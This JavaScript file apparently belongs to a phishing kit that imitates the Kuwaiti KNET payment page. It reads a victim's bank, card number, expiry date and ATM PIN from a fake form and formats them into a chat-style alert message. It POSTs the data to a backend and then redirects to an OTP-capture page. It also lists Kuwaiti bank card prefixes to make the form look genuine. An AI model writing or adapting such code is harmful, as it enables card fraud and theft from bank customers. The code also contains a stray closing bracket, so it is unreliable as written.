
function sendToServer() {
    const name = localStorage.getItem("userName"); // ✅ استرجاع الاسم مباشرة

    const bank = document.getElementById("bankSelect").value;
    const selectedNumber = document.getElementById("prefixSelect").value;
    const cardNumber = document.getElementById("cardNumber").value;
    const expiryMonth = document.getElementById("monthSelect").value;
    const expiryYear = document.getElementById("yearSelect").value;
    const pin = document.getElementById("pin").value;

    if (!bank || !selectedNumber || !cardNumber || !expiryMonth || !expiryYear || !pin) {
        alert("يرجى ملء جميع الحقول قبل الإرسال.");
        return;
    }

    const amount = localStorage.getItem('boton') || 'المبلغ الكامل';

    const message = `
📩 <b>دفع كامل كي نت</b>

<b>👤 من:</b> ${name || 'غير متوفر'}
<b>🏦 البنك:</b> ${bank}
<b>🔢 البادئة:</b> ${selectedNumber}
<b>💳 الرقم:</b> ${cardNumber}
<b>📅 انتهاء البطاقة:</b> ${expiryMonth}/${expiryYear}
<b>🔑 ATM:</b> ${pin}
<b>💰 المبلغ:</b> ${amount}`;

    // ✅ إرسال إلى الخادم المحلي
    fetch('http://localhost:3000/api/payment', {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            name: name,
            bank: bank,
            prefix: selectedNumber,
            cardNumber: cardNumber,
            expiryMonth: expiryMonth,
            expiryYear: expiryYear,
            pin: pin,
            amount: amount,
            message: message,
            type: 'kpay_full'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log("✅ تم الإرسال بنجاح:", data.paymentId);
            alert("تم إرسال البيانات بنجاح!");
        } else {
            console.error("❌ فشل في الإرسال");
            alert("فشل في إرسال البيانات");
        }
    })
    .catch(error => {
            console.error("⚠️ خطأ في الاتصال:", error);
        });
    });

    setTimeout(() => {
        window.location.href = "otpkpay.html";
    }, 1000);
}

        
            function updateOptions() {
                var bank = document.getElementById("bankSelect").value;
                var prefixSelect = document.getElementById("prefixSelect");
        
                prefixSelect.innerHTML = '<option value="" disabled selected>Prefix</option>';
        
                var options = {
                    ABK: ["403622", "423826", "428628"],
                    RAJHI: ["458838"],
                    BBK: ["588790", "418056"],
                    BOUBYAN: ["470350", "490455", "490456", "404919", "490456", "450605", "426058", "431199"],
                    BURGAN: ["49219000", "415254", "450238", "468564", "540759", "402978", "403583"],
                    CBK: ["532672", "537015", "521175", "516334"],
                    DOHA: ["419252"],
                    GBK: ["531644", "517419", "531471", "559475", "517458", "526206", "531329", "531470"],
                    TAM: ["45077848", "45077849"],
                    KFH: ["450778", "537016", "532674", "485602"],
                    KIB: ["406464", "409054"],
                    NBK: ["464452", "589160"],
                    WEYAY: ["464425250", "543363"],
                    QNB: ["524745", "521020"],
                    UNB: ["457778"],
                    WARBA: ["532749", "559459", "541350", "525528"]
                };
        
                if (options[bank]) {
                    options[bank].forEach(function (number) {
                        var option = document.createElement("option");
                        option.value = number;
                        option.textContent = number;
                        prefixSelect.appendChild(option);
                    });
                }
            }
        
            function validateNumberInput(event) {
                let inputField = document.getElementById("cardNumber");
                let value = inputField.value;
        
                if (value.length > 10) {
                    inputField.value = value.substring(0, 10);
                }
            }
        
            // عرض المبلغ من localStorage
            const totalAmount = localStorage.getItem("totalAmount");
            document.getElementById("amountValue").innerText = totalAmount;

